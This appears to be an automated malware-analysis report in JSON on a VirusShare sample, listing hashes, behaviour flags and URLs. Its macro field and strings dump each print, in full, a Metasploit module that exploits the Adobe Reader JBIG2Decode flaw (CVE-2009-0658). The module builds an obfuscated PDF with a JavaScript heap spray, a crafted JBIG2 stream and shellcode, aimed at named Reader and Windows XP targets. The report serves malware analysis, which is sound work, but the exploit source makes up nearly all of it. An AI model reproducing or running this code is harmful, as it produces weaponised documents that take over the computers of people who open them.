{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CALL": "May call a DLL using Excel 4 Macros",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Windows": "May enumerate application windows",
            "chr": "May attempt to obfuscate specific str"
        },
        "macro": "##\n# $Id$\n##\n\n##\n# This file is part of the Metasploit Framework and may be subject to\n# redistribution and commercial restrictions. Please see the Metasploit\n# Framework web site for more information on licensing and terms of use.\n# http://metasploit.com/framework/\n##\n\nrequire 'msf/core'\nrequire 'zlib'\n\nclass Metasploit3 < Msf::Exploit::Remote\n\tRank = GoodRanking\n\n\tinclude Msf::Exploit::FILEFORMAT\n\n\tdef initialize(info = {})\n\t\tsuper(update_info(info,\n\t\t\t'Name'           => 'Adobe JBIG2Decode Memory Corruption Exploit',\n\t\t\t'Description'    => %q{\n\t\t\t\t\tThis module exploits a heap-based pointer corruption flaw in Adobe Reader 9.0.0 and earlier.\n\t\t\t\t\tThis module relies upon javascript for the heap spray.\n\t\t\t},\n\t\t\t'License'        => MSF_LICENSE,\n\t\t\t'Author'         =>\n\t\t\t\t[\n\t\t\t\t\t# Metasploit implementation\n\t\t\t\t\t'natron',\n\t\t\t\t\t# bl4cksecurity blog explanation of vuln [see References]\n\t\t\t\t\t'xort', 'redsand',\n\t\t\t\t\t# obfuscation techniques and pdf template from util_printf\n\t\t\t\t\t'MC', 'Didier Stevens <didier.stevens[at]gmail.com>',\n\t\t\t\t],\n\t\t\t'Version'        => '$Revision$',\n\t\t\t'References'     =>\n\t\t\t\t[\n\t\t\t\t\t[ 'CVE' , '2009-0658' ],\n\t\t\t\t\t[ 'OSVDB', '52073' ],\n\t\t\t\t\t[ 'URL', 'http://bl4cksecurity.blogspot.com/2009/03/adobe-acrobatreader-universal-exploit.html'],\n\t\t\t\t],\n\t\t\t'DefaultOptions' =>\n\t\t\t\t{\n\t\t\t\t\t'EXITFUNC' => 'process',\n\t\t\t\t\t'DisablePayloadHandler' => 'true',\n\t\t\t\t},\n\t\t\t'Payload'        =>\n\t\t\t\t{\n\t\t\t\t\t'Space'         => 1024,\n\t\t\t\t\t'BadChars'      => \"\"\n\t\t\t\t},\n\t\t\t'Platform'       => 'win',\n\t\t\t'Targets'        =>\n\t\t\t\t[\n\t\t\t\t\t[ 'Adobe Reader v9.0.0 (Windows XP SP3 English)', { 'Ret' => 0x0166B550 } ], # Ret * 5 == 0x07018A90 (BIB.dll)\n\t\t\t\t\t[ 'Adobe Reader v8.1.2 (Windows XP SP2 English)', { 'Ret' => 0x9B004870 } ], # Ret * 5 == 0x07017A30 (BIB.dll)\n\t\t\t\t],\n\t\t\t'DisclosureDate' => 'Feb 19 2009',\n\t\t\t'DefaultTarget'  => 0))\n\n\t\tregister_options([\n\t\t\tOptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),\n\t\t], self.class)\n\n\t\tend\n\n\tdef exploit\n\t\t# Encode the shellcode.\n\t\tshellcode \t\t= Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\t\tptroverwrite \t= Rex::Text.to_unescape([target.ret].pack(\"V\"))\n\n\t\tnops    = Rex::Text.to_unescape(make_nops(4))\n\n\t\t# Randomize some variables\n\t\trand1\t= rand_text_alpha(rand(50) + 1)\n\t\trand2\t= rand_text_alpha(rand(50) + 1)\n\t\trand3\t= rand_text_alpha(rand(50) + 1)\n\t\trand4\t= rand_text_alpha(rand(50) + 1)\n\t\trand5\t= rand_text_alpha(rand(50) + 1)\n\t\trand6\t= rand_text_alpha(rand(50) + 1)\n\t\trand7\t= rand_text_alpha(rand(50) + 1)\n\t\trand8\t= rand_text_alpha(rand(50) + 1)\n\t\trand9\t= rand_text_alpha(rand(50) + 1)\n\t\trand10\t= rand_text_alpha(rand(50) + 1)\n\t\trand11\t= rand_text_alpha(rand(50) + 1)\n\t\trand12\t= rand_text_alpha(rand(50) + 1)\n\t\trand13\t= rand_text_alpha(rand(50) + 1)\n\t\trand14\t= rand_text_alpha(rand(50) + 1)\n\t\trand15\t= rand_text_alpha(rand(50) + 1)\n\t\trand16\t= rand_text_alpha(rand(50) + 1)\n\n\t\tscript = %Q|\n\t\tvar #{rand1} = \"\";\n\t\tvar #{rand2} = \"\";\n\t\tvar #{rand3} = unescape(\"#{shellcode}\");\n\t\tvar #{rand4} = \"\";\n\n\t\tfor (#{rand5}=128;#{rand5}>=0;--#{rand5}) #{rand4} += unescape(\"#{nops}\");\n\t\t#{rand6} = #{rand4} + #{rand3};\n\t\t#{rand7} = unescape(\"#{nops}\");\n\t\t#{rand8} = 20;\n\t\t#{rand9} = #{rand8}+#{rand6}.length\n\t\twhile (#{rand7}.length<#{rand9}) #{rand7}+=#{rand7};\n\t\t#{rand10} = #{rand7}.substring(0, #{rand9});\n\t\t#{rand11} = #{rand7}.substring(0, #{rand7}.length-#{rand9});\n\t\twhile(#{rand11}.length+#{rand9} < 0x40000) #{rand11} = #{rand11}+#{rand11}+#{rand10};\n\t\t#{rand12} = new Array();\n\t\tfor (#{rand5}=0;#{rand5}<100;#{rand5}++) #{rand12}[#{rand5}] = #{rand11} + #{rand6};\n\n\t\tfor (#{rand5}=142;#{rand5}>=0;--#{rand5}) #{rand2} += unescape(\"#{ptroverwrite}\");\n\t\t#{rand13} = #{rand2}.length + 20\n\t\twhile (#{rand2}.length < #{rand13}) #{rand2} += #{rand2};\n\t\t#{rand14} = #{rand2}.substring(0, #{rand13});\n\t\t#{rand15} = #{rand2}.substring(0, #{rand2}.length-#{rand13});\n\t\twhile(#{rand15}.length+#{rand13} < 0x40000) #{rand15} = #{rand15}+#{rand15}+#{rand14};\n\t\t#{rand16} = new Array();\n\t\tfor (#{rand5}=0;#{rand5}<125;#{rand5}++) #{rand16}[#{rand5}] = #{rand15} + #{rand2};\n|\n\t\teaxptr\t\t= \"\\x00\\x20\\x50\\xff\" \t\t# CALL DWORD PTR DS:[EAX+20]\n\t\teaxp20ptr\t= \"\\x05\\x69\\x50\\x50\"\t\t# Shellcode location called by CALL DWORD PTR DS:[EAX+20]\n\t\tmodifier\t= \"\\x00\\x69\\x00\\x00\"\t\t# ECX values seen: 02004A00, 033C9F58, 0338A228, 031C51F8, 0337B418\n\t\t\t\t\t\t\t\t# natron@kubuntu-nkvm:~$ ./pdf-calc-val.rb 0x690000\n\t\t\t\t\t\t\t\t# EAX: 0x690000   ECX: 0x2004a00   WriteAddr: 0xa3449ec\n\t\t\t\t\t\t\t\t# EAX: 0x690000   ECX: 0x358a228   WriteAddr: 0xb8ca214\n\n\t\tjbig2stream\t= eaxptr + \"\\x40\\x00\" + modifier + eaxp20ptr\n\n\t\t# Create the pdf\n\t\tpdf = make_pdf(script, jbig2stream)\n\n\t\tprint_status(\"Creating '#{datastore['FILENAME']}' file...\")\n\n\t\tfile_create(pdf)\n\tend\n\n\tdef RandomNonASCIIString(count)\n\t\tresult = \"\"\n\t\tcount.times do\n\t\t\tresult << (rand(128) + 128).chr\n\t\tend\n\t\tresult\n\tend\n\n\tdef ioDef(id)\n\t\t\"%d 0 obj\" % id\n\tend\n\n\tdef ioRef(id)\n\t\t\"%d 0 R\" % id\n\tend\n\n\t#http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/\n\tdef nObfu(str)\n\t\tresult = \"\"\n\t\tstr.scan(/./u) do |c|\n\t\t\tif rand(3) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'\n\t\t\t\tresult << \"#%x\" % c.unpack(\"C*\")[0]\n\t\t\t# Randomize the spaces and newlines\n\t\t\telsif c == \" \"\n\t\t\t\tresult << \" \" * (rand(3) + 1)\n\t\t\t\tif rand(2) == 0\n\t\t\t\t\tresult << \"\\x0d\\x0a\"\n\t\t\t\t\tresult << \" \" * rand(2)\n\t\t\t\tend\n\t\t\telse\n\t\t\t\tresult << c\n\t\t\tend\n\t\tend\n\t\tresult\n\tend\n\n\tdef ASCIIHexWhitespaceEncode(str)\n\t\tresult = \"\"\n\t\twhitespace = \"\"\n\t\tstr.each_byte do |b|\n\t\t\tresult << whitespace << \"%02x\" % b\n\t\t\twhitespace = \" \" * (rand(3) + 1)\n\t\tend\n\t\tresult << \">\"\n\tend\n\n\tdef make_pdf(js, jbig2)\n\n\t\txref = []\n\t\teol = \"\\x0d\\x0a\"\n\t\tendobj = \"endobj\" << eol\n\n\t\tpdf = \"%PDF-1.5\" << eol\n\t\tpdf << \"%\" << RandomNonASCIIString(4) << eol\n\t\txref << pdf.length\n\t\tpdf << nObfu(\" \") << ioDef(1) << nObfu(\" << /Type /Catalog /Outlines \") << ioRef(2) << nObfu(\" /Pages \") << ioRef(3) << nObfu(\" /OpenAction \") << ioRef(5) << \" >> \" << endobj\n\t\txref << pdf.length\n\t\tpdf << nObfu(\" \") << ioDef(2) << nObfu(\" << /Type /Outlines /Count 0 >> \") << endobj\n\t\txref << pdf.length\n\t\tpdf << nObfu(\" \") << ioDef(3) << nObfu(\" << /Type /Pages /Kids [ \") << ioRef(4) << nObfu(\" \") << ioRef(7) << nObfu(\" ] /Count 2 >> \") << endobj\n\t\txref << pdf.length\n\t\tpdf << nObfu(\" \") << ioDef(4) << nObfu(\" << /Type /Page /Parent \") << ioRef(3) << nObfu(\" /MediaBox [0 0 612 792 ] >> \") << endobj\n\t\txref << pdf.length\n\t\tpdf << nObfu(\" \") << ioDef(5) << nObfu(\" << /Type /Action /S /JavaScript /JS \") + ioRef(6) + \" >> \" << endobj\n\t\txref << pdf.length\n\n\t\tcompressed = Zlib::Deflate.deflate(ASCIIHexWhitespaceEncode(js), rand(5)+4) # Add random 4-9 compression level\n\t\tpdf << nObfu(\" \") << ioDef(6) << nObfu(\" << /Length %s /Filter [ /FlateDecode /ASCIIHexDecode ] >>\" % compressed.length) << eol\n\t\tpdf << \"stream\" << eol\n\t\tpdf << compressed << eol\n\t\tpdf << \"endstream\" << eol\n\t\tpdf << endobj\n\t\txref << pdf.length\n\n\t\tpdf << nObfu(\" \") << ioDef(7) << nObfu(\" << /Type /Page /Parent \") << ioRef(3) << \" /Contents [ \" << ioRef(8) << \" ] >> \" << eol\n\n\t\txref << pdf.length\n\t\tcompressed = Zlib::Deflate.deflate(jbig2.unpack('H*')[0], rand(8)+1) # Convert to ASCII hex, then deflate using random 1-9 compression\n\t\tpdf << nObfu(\" \") << ioDef(8) << nObfu(\" << /Length %s /Filter [ /FlateDecode /ASCIIHexDecode /JBIG2Decode ] >> \" % compressed.length) << eol\n\t\tpdf << \"stream\" << eol\n\t\tpdf << compressed << eol\n\t\tpdf << \"endstream\" << eol\n\t\tpdf << endobj\n\n\t\txrefPosition = pdf.length\n\t\tpdf << \"xref\" << eol\n\t\tpdf << \"0 %d\" % (xref.length + 1) << eol\n\t\tpdf << \"0000000000 65535 f\" << eol\n\t\txref.each do |index|\n\t\t\tpdf << \"%010d 00000 n\" % index << eol\n\t\tend\n\t\tpdf << \"trailer\" << nObfu(\"<< /Size %d /Root \" % (xref.length + 1)) << ioRef(1) << \" >> \" << eol\n\t\tpdf << \"startxref\" << eol\n\t\tpdf << xrefPosition.to_s() << eol\n\t\tpdf << \"%%EOF\" << eol\n\tend\n\nend\n"
    },
    "filename": "VirusShare_101828598f07cf3aa1b14235a50224bb",
    "filesize": 7779,
    "filetype": "Ruby script, ASCII text",
    "hashes": {
        "md5": "101828598f07cf3aa1b14235a50224bb",
        "sha1": "2ab7a6daf9bd0ae616d668dfc5a9049575bd882e",
        "sha256": "a063d4668d00c75abbec6720de7f09ed163d0ee3b582034dfce9b8329e3b6101"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "# $Id$",
            "# This file is part of the Metasploit Framework and may be subject to",
            "# redistribution and commercial restrictions. Please see the Metasploit",
            "# Framework web site for more information on licensing and terms of use.",
            "# http://metasploit.com/framework/",
            "require 'msf/core'",
            "require 'zlib'",
            "class Metasploit3 < Msf::Exploit::Remote",
            "\tRank = GoodRanking",
            "\tinclude Msf::Exploit::FILEFORMAT",
            "\tdef initialize(info = {})",
            "\t\tsuper(update_info(info,",
            "\t\t\t'Name'           => 'Adobe JBIG2Decode Memory Corruption Exploit',",
            "\t\t\t'Description'    => %q{",
            "\t\t\t\t\tThis module exploits a heap-based pointer corruption flaw in Adobe Reader 9.0.0 and earlier.",
            "\t\t\t\t\tThis module relies upon javascript for the heap spray.",
            "\t\t\t},",
            "\t\t\t'License'        => MSF_LICENSE,",
            "\t\t\t'Author'         =>",
            "\t\t\t\t[",
            "\t\t\t\t\t# Metasploit implementation",
            "\t\t\t\t\t'natron',",
            "\t\t\t\t\t# bl4cksecurity blog explanation of vuln [see References]",
            "\t\t\t\t\t'xort', 'redsand',",
            "\t\t\t\t\t# obfuscation techniques and pdf template from util_printf",
            "\t\t\t\t\t'MC', 'Didier Stevens <didier.stevens[at]gmail.com>',",
            "\t\t\t\t],",
            "\t\t\t'Version'        => '$Revision$',",
            "\t\t\t'References'     =>",
            "\t\t\t\t[",
            "\t\t\t\t\t[ 'CVE' , '2009-0658' ],",
            "\t\t\t\t\t[ 'OSVDB', '52073' ],",
            "\t\t\t\t\t[ 'URL', 'http://bl4cksecurity.blogspot.com/2009/03/adobe-acrobatreader-universal-exploit.html'],",
            "\t\t\t\t],",
            "\t\t\t'DefaultOptions' =>",
            "\t\t\t\t{",
            "\t\t\t\t\t'EXITFUNC' => 'process',",
            "\t\t\t\t\t'DisablePayloadHandler' => 'true',",
            "\t\t\t\t},",
            "\t\t\t'Payload'        =>",
            "\t\t\t\t{",
            "\t\t\t\t\t'Space'         => 1024,",
            "\t\t\t\t\t'BadChars'      => \"\"",
            "\t\t\t\t},",
            "\t\t\t'Platform'       => 'win',",
            "\t\t\t'Targets'        =>",
            "\t\t\t\t[",
            "\t\t\t\t\t[ 'Adobe Reader v9.0.0 (Windows XP SP3 English)', { 'Ret' => 0x0166B550 } ], # Ret * 5 == 0x07018A90 (BIB.dll)",
            "\t\t\t\t\t[ 'Adobe Reader v8.1.2 (Windows XP SP2 English)', { 'Ret' => 0x9B004870 } ], # Ret * 5 == 0x07017A30 (BIB.dll)",
            "\t\t\t\t],",
            "\t\t\t'DisclosureDate' => 'Feb 19 2009',",
            "\t\t\t'DefaultTarget'  => 0))",
            "\t\tregister_options([",
            "\t\t\tOptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),",
            "\t\t], self.class)",
            "\t\tend",
            "\tdef exploit",
            "\t\t# Encode the shellcode.",
            "\t\tshellcode \t\t= Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))",
            "\t\tptroverwrite \t= Rex::Text.to_unescape([target.ret].pack(\"V\"))",
            "\t\tnops    = Rex::Text.to_unescape(make_nops(4))",
            "\t\t# Randomize some variables",
            "\t\trand1\t= rand_text_alpha(rand(50) + 1)",
            "\t\trand2\t= rand_text_alpha(rand(50) + 1)",
            "\t\trand3\t= rand_text_alpha(rand(50) + 1)",
            "\t\trand4\t= rand_text_alpha(rand(50) + 1)",
            "\t\trand5\t= rand_text_alpha(rand(50) + 1)",
            "\t\trand6\t= rand_text_alpha(rand(50) + 1)",
            "\t\trand7\t= rand_text_alpha(rand(50) + 1)",
            "\t\trand8\t= rand_text_alpha(rand(50) + 1)",
            "\t\trand9\t= rand_text_alpha(rand(50) + 1)",
            "\t\trand10\t= rand_text_alpha(rand(50) + 1)",
            "\t\trand11\t= rand_text_alpha(rand(50) + 1)",
            "\t\trand12\t= rand_text_alpha(rand(50) + 1)",
            "\t\trand13\t= rand_text_alpha(rand(50) + 1)",
            "\t\trand14\t= rand_text_alpha(rand(50) + 1)",
            "\t\trand15\t= rand_text_alpha(rand(50) + 1)",
            "\t\trand16\t= rand_text_alpha(rand(50) + 1)",
            "\t\tscript = %Q|",
            "\t\tvar #{rand1} = \"\";",
            "\t\tvar #{rand2} = \"\";",
            "\t\tvar #{rand3} = unescape(\"#{shellcode}\");",
            "\t\tvar #{rand4} = \"\";",
            "\t\tfor (#{rand5}=128;#{rand5}>=0;--#{rand5}) #{rand4} += unescape(\"#{nops}\");",
            "\t\t#{rand6} = #{rand4} + #{rand3};",
            "\t\t#{rand7} = unescape(\"#{nops}\");",
            "\t\t#{rand8} = 20;",
            "\t\t#{rand9} = #{rand8}+#{rand6}.length",
            "\t\twhile (#{rand7}.length<#{rand9}) #{rand7}+=#{rand7};",
            "\t\t#{rand10} = #{rand7}.substring(0, #{rand9});",
            "\t\t#{rand11} = #{rand7}.substring(0, #{rand7}.length-#{rand9});",
            "\t\twhile(#{rand11}.length+#{rand9} < 0x40000) #{rand11} = #{rand11}+#{rand11}+#{rand10};",
            "\t\t#{rand12} = new Array();",
            "\t\tfor (#{rand5}=0;#{rand5}<100;#{rand5}++) #{rand12}[#{rand5}] = #{rand11} + #{rand6};",
            "\t\tfor (#{rand5}=142;#{rand5}>=0;--#{rand5}) #{rand2} += unescape(\"#{ptroverwrite}\");",
            "\t\t#{rand13} = #{rand2}.length + 20",
            "\t\twhile (#{rand2}.length < #{rand13}) #{rand2} += #{rand2};",
            "\t\t#{rand14} = #{rand2}.substring(0, #{rand13});",
            "\t\t#{rand15} = #{rand2}.substring(0, #{rand2}.length-#{rand13});",
            "\t\twhile(#{rand15}.length+#{rand13} < 0x40000) #{rand15} = #{rand15}+#{rand15}+#{rand14};",
            "\t\t#{rand16} = new Array();",
            "\t\tfor (#{rand5}=0;#{rand5}<125;#{rand5}++) #{rand16}[#{rand5}] = #{rand15} + #{rand2};",
            "\t\teaxptr\t\t= \"\\x00\\x20\\x50\\xff\" \t\t# CALL DWORD PTR DS:[EAX+20]",
            "\t\teaxp20ptr\t= \"\\x05\\x69\\x50\\x50\"\t\t# Shellcode location called by CALL DWORD PTR DS:[EAX+20]",
            "\t\tmodifier\t= \"\\x00\\x69\\x00\\x00\"\t\t# ECX values seen: 02004A00, 033C9F58, 0338A228, 031C51F8, 0337B418",
            "\t\t\t\t\t\t\t\t# natron@kubuntu-nkvm:~$ ./pdf-calc-val.rb 0x690000",
            "\t\t\t\t\t\t\t\t# EAX: 0x690000   ECX: 0x2004a00   WriteAddr: 0xa3449ec",
            "\t\t\t\t\t\t\t\t# EAX: 0x690000   ECX: 0x358a228   WriteAddr: 0xb8ca214",
            "\t\tjbig2stream\t= eaxptr + \"\\x40\\x00\" + modifier + eaxp20ptr",
            "\t\t# Create the pdf",
            "\t\tpdf = make_pdf(script, jbig2stream)",
            "\t\tprint_status(\"Creating '#{datastore['FILENAME']}' file...\")",
            "\t\tfile_create(pdf)",
            "\tend",
            "\tdef RandomNonASCIIString(count)",
            "\t\tresult = \"\"",
            "\t\tcount.times do",
            "\t\t\tresult << (rand(128) + 128).chr",
            "\t\tend",
            "\t\tresult",
            "\tend",
            "\tdef ioDef(id)",
            "\t\t\"%d 0 obj\" % id",
            "\tend",
            "\tdef ioRef(id)",
            "\t\t\"%d 0 R\" % id",
            "\tend",
            "\t#http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/",
            "\tdef nObfu(str)",
            "\t\tresult = \"\"",
            "\t\tstr.scan(/./u) do |c|",
            "\t\t\tif rand(3) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'",
            "\t\t\t\tresult << \"#%x\" % c.unpack(\"C*\")[0]",
            "\t\t\t# Randomize the spaces and newlines",
            "\t\t\telsif c == \" \"",
            "\t\t\t\tresult << \" \" * (rand(3) + 1)",
            "\t\t\t\tif rand(2) == 0",
            "\t\t\t\t\tresult << \"\\x0d\\x0a\"",
            "\t\t\t\t\tresult << \" \" * rand(2)",
            "\t\t\t\tend",
            "\t\t\telse",
            "\t\t\t\tresult << c",
            "\t\t\tend",
            "\t\tend",
            "\t\tresult",
            "\tend",
            "\tdef ASCIIHexWhitespaceEncode(str)",
            "\t\tresult = \"\"",
            "\t\twhitespace = \"\"",
            "\t\tstr.each_byte do |b|",
            "\t\t\tresult << whitespace << \"%02x\" % b",
            "\t\t\twhitespace = \" \" * (rand(3) + 1)",
            "\t\tend",
            "\t\tresult << \">\"",
            "\tend",
            "\tdef make_pdf(js, jbig2)",
            "\t\txref = []",
            "\t\teol = \"\\x0d\\x0a\"",
            "\t\tendobj = \"endobj\" << eol",
            "\t\tpdf = \"%PDF-1.5\" << eol",
            "\t\tpdf << \"%\" << RandomNonASCIIString(4) << eol",
            "\t\txref << pdf.length",
            "\t\tpdf << nObfu(\" \") << ioDef(1) << nObfu(\" << /Type /Catalog /Outlines \") << ioRef(2) << nObfu(\" /Pages \") << ioRef(3) << nObfu(\" /OpenAction \") << ioRef(5) << \" >> \" << endobj",
            "\t\txref << pdf.length",
            "\t\tpdf << nObfu(\" \") << ioDef(2) << nObfu(\" << /Type /Outlines /Count 0 >> \") << endobj",
            "\t\txref << pdf.length",
            "\t\tpdf << nObfu(\" \") << ioDef(3) << nObfu(\" << /Type /Pages /Kids [ \") << ioRef(4) << nObfu(\" \") << ioRef(7) << nObfu(\" ] /Count 2 >> \") << endobj",
            "\t\txref << pdf.length",
            "\t\tpdf << nObfu(\" \") << ioDef(4) << nObfu(\" << /Type /Page /Parent \") << ioRef(3) << nObfu(\" /MediaBox [0 0 612 792 ] >> \") << endobj",
            "\t\txref << pdf.length",
            "\t\tpdf << nObfu(\" \") << ioDef(5) << nObfu(\" << /Type /Action /S /JavaScript /JS \") + ioRef(6) + \" >> \" << endobj",
            "\t\txref << pdf.length",
            "\t\tcompressed = Zlib::Deflate.deflate(ASCIIHexWhitespaceEncode(js), rand(5)+4) # Add random 4-9 compression level",
            "\t\tpdf << nObfu(\" \") << ioDef(6) << nObfu(\" << /Length %s /Filter [ /FlateDecode /ASCIIHexDecode ] >>\" % compressed.length) << eol",
            "\t\tpdf << \"stream\" << eol",
            "\t\tpdf << compressed << eol",
            "\t\tpdf << \"endstream\" << eol",
            "\t\tpdf << endobj",
            "\t\txref << pdf.length",
            "\t\tpdf << nObfu(\" \") << ioDef(7) << nObfu(\" << /Type /Page /Parent \") << ioRef(3) << \" /Contents [ \" << ioRef(8) << \" ] >> \" << eol",
            "\t\txref << pdf.length",
            "\t\tcompressed = Zlib::Deflate.deflate(jbig2.unpack('H*')[0], rand(8)+1) # Convert to ASCII hex, then deflate using random 1-9 compression",
            "\t\tpdf << nObfu(\" \") << ioDef(8) << nObfu(\" << /Length %s /Filter [ /FlateDecode /ASCIIHexDecode /JBIG2Decode ] >> \" % compressed.length) << eol",
            "\t\tpdf << \"stream\" << eol",
            "\t\tpdf << compressed << eol",
            "\t\tpdf << \"endstream\" << eol",
            "\t\tpdf << endobj",
            "\t\txrefPosition = pdf.length",
            "\t\tpdf << \"xref\" << eol",
            "\t\tpdf << \"0 %d\" % (xref.length + 1) << eol",
            "\t\tpdf << \"0000000000 65535 f\" << eol",
            "\t\txref.each do |index|",
            "\t\t\tpdf << \"%010d 00000 n\" % index << eol",
            "\t\tend",
            "\t\tpdf << \"trailer\" << nObfu(\"<< /Size %d /Root \" % (xref.length + 1)) << ioRef(1) << \" >> \" << eol",
            "\t\tpdf << \"startxref\" << eol",
            "\t\tpdf << xrefPosition.to_s() << eol",
            "\t\tpdf << \"%%EOF\" << eol",
            "\tend"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/",
            "http://metasploit.com/framework/",
            "http://bl4cksecurity.blogspot.com/2009/03/adobe-acrobatreader-universal-exploit.html"
        ]
    },
    "time": "0:00:00.317973",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
